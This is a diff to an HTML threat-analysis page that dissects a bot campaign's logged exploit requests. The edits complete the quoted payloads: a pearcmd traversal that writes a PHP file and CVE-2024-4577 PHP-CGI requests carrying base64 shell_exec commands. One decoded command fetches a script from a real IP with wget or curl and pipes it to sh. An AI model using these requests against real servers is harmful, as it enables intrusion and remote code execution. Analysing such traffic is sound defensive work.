@@ -193,7 +193,7 @@ td code{overflow-wrap:anywhere}
 14:21:26  GET  404  /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 14:21:27  GET  200  /index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=Hello
 14:21:27  GET  404  /public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=Hello
-14:21:27  GET  200  /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&amp;/&lt;?echo(md5("hi"))
+14:21:27  GET  200  /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&amp;/&lt;?echo(md5("hi"));?&gt;+/tmp/index1.php
 14:21:28  GET  200  /index.php?lang=../../../../../../../../tmp/index1
 14:21:28  GET  404  /containers/json</code></pre>
 <p>The two opening requests have no User-Agent and nginx rejected them with <code>400</code> before logging a URI, because the traversal sequences are not a valid path. They are the Apache 2.4.49 / 2.4.50 traversal (<code>/cgi-bin/.%2e/.%2e/…/bin/sh</code> and the double-encoded <code>%%32%65</code> form). The 37 PHPUnit requests all carry the body <code>&lt;?php echo(md5("Hello PHPUnit"));</code> — a check, not a payload: the bot looks for the MD5 in the response and only then sends the real thing. The same is true of the ThinkPHP (<code>md5("Hello")</code>) and pearcmd (<code>md5("hi")</code>) requests. Only the PHP-CGI requests carry the dropper on first contact.</p>
@@ -215,7 +215,7 @@ POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
 User-Agent: libredtail-http
 Content-Type: application/x-www-form-urlencoded
 
-&lt;?php shell_exec(base64_decode("Y2QgL3RtcCB8fCBjZCAvdmFyL3RtcCB8fCBjZCAvZGV2L3NobTsgZWNobyAnLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUg[... 960 base64 characters, decoded in full below ...]ZV8yMDI0XzQ1Nzc7IGZpOyBybSAtcmYgc3NoY2ZnIGtleS5wcGsgb3V0X3No"))  echo(md5("Hello CVE-2024-4577"))  ?&gt;</code></pre>
+&lt;?php shell_exec(base64_decode("Y2QgL3RtcCB8fCBjZCAvdmFyL3RtcCB8fCBjZCAvZGV2L3NobTsgZWNobyAnLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUg[... 960 base64 characters, decoded in full below ...]ZV8yMDI0XzQ1Nzc7IGZpOyBybSAtcmYgc3NoY2ZnIGtleS5wcGsgb3V0X3No")); echo(md5("Hello CVE-2024-4577")); ?&gt;</code></pre>
 
 <h2>4. Decoded and Explained</h2>
 <p>The 1,116-character base64 string decodes to this shell script. We removed the body of the private key; everything else is as sent (line breaks added after each <code>;</code>):</p>
@@ -257,7 +257,7 @@ POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
 User-Agent: libredtail-http
 Content-Type: application/x-www-form-urlencoded
 
-&lt;?php shell_exec(base64_decode("KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMjE3LjYwLjEwMi41L3NoIHx8IGN1cmwgLXNrIGh0dHBzOi8vMjE3LjYwLjEwMi41L3NoKSB8IHNoIC1zIGN2ZV8yMDI0XzQ1Nzc="))  echo(md5("Hello CVE-2024-4577"))  ?&gt;</code></pre>
+&lt;?php shell_exec(base64_decode("KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMjE3LjYwLjEwMi41L3NoIHx8IGN1cmwgLXNrIGh0dHBzOi8vMjE3LjYwLjEwMi41L3NoKSB8IHNoIC1zIGN2ZV8yMDI0XzQ1Nzc=")); echo(md5("Hello CVE-2024-4577")); ?&gt;</code></pre>
 <p>Decoded:</p>
 <pre><code>(wget --no-check-certificate -qO- hxxps://217.60.102.5/sh || curl -sk hxxps://217.60.102.5/sh) | sh -s cve_2024_4577</code></pre>
 <p>Same server, same script name, same campaign tag. Both variants were in circulation in the same fortnight; the table in section 2 shows which IP sent which.</p>
